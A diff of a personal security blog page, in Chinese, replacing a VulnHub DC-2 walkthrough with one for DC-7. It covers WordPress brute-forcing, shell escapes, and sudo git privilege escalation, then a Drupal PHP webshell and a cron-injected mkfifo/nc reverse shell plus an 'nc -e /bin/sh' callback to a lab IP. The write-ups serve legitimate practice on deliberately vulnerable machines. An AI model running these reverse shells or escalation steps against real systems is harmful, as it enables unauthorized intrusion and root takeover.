@@ -79,27 +79,36 @@
 
 
 
-<meta name="description" content="DC-2Author:Xingg靶机下载:vulnhub-DC2wpscan搜集信息进入后台，sudo git权限 more less提权root">
+<meta name="description" content="DC-7Author:Xingg社工到github下载源码，找到数据库账号密码，同密码连接ssh，在用户权限下用drush工具修改后台账号密码，在后台写入webshell，然后在root执行的crontab里写入bash命令拿到root">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-2">
-<meta property="og:url" content="http://yoursite.com/2020/03/17/DC-2/index.html">
+<meta property="og:title" content="DC-7">
+<meta property="og:url" content="http://yoursite.com/2020/03/17/DC-7/index.html">
 <meta property="og:site_name" content="Xingg&#39;s Blog">
-<meta property="og:description" content="DC-2Author:Xingg靶机下载:vulnhub-DC2wpscan搜集信息进入后台，sudo git权限 more less提权root">
+<meta property="og:description" content="DC-7Author:Xingg社工到github下载源码，找到数据库账号密码，同密码连接ssh，在用户权限下用drush工具修改后台账号密码，在后台写入webshell，然后在root执行的crontab里写入bash命令拿到root">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101212927985.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213208553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213240355.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213255692.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213717951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213854782.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214000603.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214244547.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214346894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214510897.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214612543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2020-03-16T16:27:19.000Z">
-<meta property="article:modified_time" content="2020-03-17T14:07:23.752Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104813757.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104825805.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104831745.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104851348.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020011910490458.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104918778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104927894.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104949774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119104957148.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105014193.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105025799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105042875.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105057871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105111176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105126470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105141874.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105142887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105203133.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105223839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105235731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105253307.png">
+<meta property="article:published_time" content="2020-03-16T23:27:19.000Z">
+<meta property="article:modified_time" content="2020-03-17T14:18:27.412Z">
 <meta property="article:author" content="Xingg">
 <meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="HTB">
@@ -107,7 +116,7 @@
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200119104813757.png">
 
 
 
@@ -137,13 +146,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/17/DC-2/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/17/DC-7/"/>
 
 
 
 
 
-  <title>DC-2 | Xingg's Blog</title>
+  <title>DC-7 | Xingg's Blog</title>
   
 
 
@@ -260,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/DC-2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/DC-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Xingg">
@@ -277,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DC-2</h1>
+          <h1 class="post-title" itemprop="name headline">DC-7</h1>
         
 
         <div class="post-meta">
@@ -289,7 +298,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-17T00:27:19+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-17T07:27:19+08:00">
                 2020-03-17
               </time>
             
@@ -349,62 +358,18 @@
       
 
       
-        <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p><strong>Author:Xingg</strong><br>靶机下载:<a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">vulnhub-DC2</a><br>wpscan搜集信息进入后台，sudo git权限 more less提权root</p>
+        <h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><p><strong>Author:Xingg</strong><br>社工到github下载源码，找到数据库账号密码，同密码连接ssh，在用户权限下用drush工具修改后台账号密码，在后台写入webshell，然后在root执行的crontab里写入bash命令拿到root</p>
 <a id="more"></a>
 
-<p>nmap扫描<br><img src="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>直接进入80端口 作者给出的提示 让我们使用cewl  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101212927985.png" alt="在这里插入图片描述"></p>
-<p>然后网站上有很多乱码的字母 应该是密码了<br>cewl是一个密码攻击工具，能够爬取网页上的所有单词生成一个列表  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w dc2.txt</span><br></pre></td></tr></table></figure>
-
-<p>网站是WordPress搭建的<br>wpscan扫描第一波没有可以用漏洞 那就枚举用户  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200101213208553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现了三个用户 admin  jerry  tom<br>然后用刚才cewl生成的字典爆破用户 得到了jerry和tom的密码  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213240355.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213255692.png" alt="在这里插入图片描述"></p>
-<table>
-<thead>
-<tr>
-<th>Username</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tom</td>
-<td>parturient</td>
-</tr>
-<tr>
-<td>jerry</td>
-<td>adipiscing</td>
-</tr>
-</tbody></table>
-<p>用jerry的账号进了wordpress后台 发现了作者给的提示  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213717951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>another way想到刚才nmap还跑出来一个ssh端口 尝试连接 用tom的账号进了  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213854782.png" alt="在这里插入图片描述"></p>
-<p>但是却被限制使用cat命令  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214000603.png" alt="在这里插入图片描述"></p>
-<p>尝试vi提权  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi </span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shel</span><br></pre></td></tr></table></figure>
-
-<p>但是发现还是不能使用cat命令<br>我们再设置PATH变量  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
-
-<p>然后就能使用cat命令了  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214244547.png" alt="在这里插入图片描述"></p>
-<p>提示说su for jerry<br>那就执行命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200101214346894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>作者提示我们git<br>果然查看sudo -l 可以执行git</p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214510897.png" alt="在这里插入图片描述">  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span> config </span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
-<p>此处用到的是less more的shell提权</p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214612543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p>
-<p>欢迎师傅们指点</p>
-<p>邮箱：<a href="mailto:xingg051@163.com">xingg051@163.com</a></p>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-7,356/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-7,356/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -p- -T5 192.168.49.21</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119104813757.png" alt="在这里插入图片描述"><br>我们进到80端口，作者提示我们不是爆破和字典攻击，让我们跳出box<br>在左下角留了一个用户，应该是Twitter的，老外都爱用Twitter<br><img src="https://img-blog.csdnimg.cn/20200119104825805.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119104831745.png" alt="在这里插入图片描述"><br>果然<br><img src="https://img-blog.csdnimg.cn/20200119104851348.png" alt="在这里插入图片描述"><br>我们把github上的内容下载下来，查看到了一个配置文件给到了一个账号和密码<br><img src="https://img-blog.csdnimg.cn/2020011910490458.png" alt="在这里插入图片描述"><br>dc7user: MdR3xOgB7#dW  </p>
+<p>连上ssh后在dc7user的home目录下发现了gpg加密的website.sql文件和一个mbox邮件<br><img src="https://img-blog.csdnimg.cn/20200119104918778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>邮件内容大概为，执行backups.sh文件，备份数据库，任务是定期执行的，根据收件时间间隔判断是15分钟左右一次<br>去看看这个文件<br><img src="https://img-blog.csdnimg.cn/20200119104927894.png" alt="在这里插入图片描述"><br>这个执行文件的拥有者是root，root所属组是www-data，所以拿到www-data权限，修改这个可执行文件，等待文件自动执行就可以反弹回一个rootshell<br><img src="https://img-blog.csdnimg.cn/20200119104949774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>里面用到了drush命令个gpg命令，尝试用gpg解密加密文件失败（太菜了不会用），然后看了一下drush，他是一个drupal的命令行管理软件，看了一下帮助文档有个选项可以修改用户密码<br><img src="https://img-blog.csdnimg.cn/20200119104957148.png" alt="在这里插入图片描述"><br>尝试运行<br><img src="https://img-blog.csdnimg.cn/20200119105014193.png" alt="在这里插入图片描述"><br>被拒绝了，百度google了半天发现，可能要cd到/var/www/html里才能运行成功<br><img src="https://img-blog.csdnimg.cn/20200119105025799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119105042875.png" alt="在这里插入图片描述"><br>ok，现在去后台看看<br>后台文本编辑模块是没有PHP的，需要自己添加（我已经添加上了）<br><img src="https://img-blog.csdnimg.cn/20200119105057871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载模块<br><img src="https://img-blog.csdnimg.cn/20200119105111176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a><br>下载成功 点击Enable启用模块<br><img src="https://img-blog.csdnimg.cn/20200119105126470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选中PHP添加进去<br><img src="https://img-blog.csdnimg.cn/20200119105141874.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119105142887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>保存，开启客户端监听，访问那个页面<br><img src="https://img-blog.csdnimg.cn/20200119105203133.png" alt="在这里插入图片描述"><br>shell已经拿到了<br>直接去修改/opt/script/backup.sh  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.49.129 9000 &gt;&#x2F;tmp&#x2F;f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>
+<p>（这段payload是看师傅们都用的这个，用到了命名管道，不懂的朋友可以自己百度一下，但是我不太懂为什么要用一段这么复杂的命令，后面我用nc也能成功弹回一个rootshell）<br><img src="https://img-blog.csdnimg.cn/20200119105223839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就等待文件自动执行吧，等一会儿，看邮箱间隔是15分钟大概<br>等到后就是root权限<br><img src="https://img-blog.csdnimg.cn/20200119105235731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">  </p>
+<p>尝试使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –e &#x2F;bin&#x2F;sh 192.168.49.129 9001</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105253307.png" alt="在这里插入图片描述"><br>也成功了<br>欢迎师傅们指点  </p>
 
       
     </div>
@@ -429,8 +394,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/17/DC-9/" rel="next" title="DC-9">
-                <i class="fa fa-chevron-left"></i> DC-9
+              <a href="/2020/03/17/DC-6/" rel="next" title="DC-6">
+                <i class="fa fa-chevron-left"></i> DC-6
               </a>
             
           </div>
@@ -439,8 +404,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/03/17/DC-3/" rel="prev" title="DC-3">
-                DC-3 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/03/17/DC-8/" rel="prev" title="DC-8">
+                DC-8 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -564,7 +529,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-2"><span class="nav-number">1.</span> <span class="nav-text">DC-2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-7"><span class="nav-number">1.</span> <span class="nav-text">DC-7</span></a></li></ol></div>
             
 
           </div>
